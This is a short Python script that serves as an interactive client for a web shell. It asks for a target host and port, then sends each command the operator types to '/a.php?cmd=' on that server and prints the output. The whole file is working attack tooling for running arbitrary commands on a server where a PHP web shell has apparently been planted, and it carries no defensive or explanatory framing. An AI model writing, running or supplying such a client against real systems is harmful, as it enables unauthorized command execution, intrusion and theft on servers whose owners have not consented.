import sys
import requests
from urllib.parse import quote


def run_shell():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <host[:port]>")
        sys.exit(1)

    target = sys.argv[1]
    if ':' in target:
        host, port = target.split(':', 1)
    else:
        host, port = target, '80'
    url = f"http://{host}:{port}/a.php"

    print(f"[+] Ready. Send commands to: {url}?cmd=<YOUR_CMD>")
    try:
        while True:
            cmd = input('> ').strip()
            if cmd.lower() in ('exit', 'quit'):
                break
            if not cmd:
                continue

            try:
                response = requests.get(f"{url}?cmd={quote(cmd)}", timeout=10)
                print(response.text.rstrip())
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}", file=sys.stderr)
    except KeyboardInterrupt:
        pass

    print('[+] Session ended.')


if __name__ == '__main__':
    run_shell()

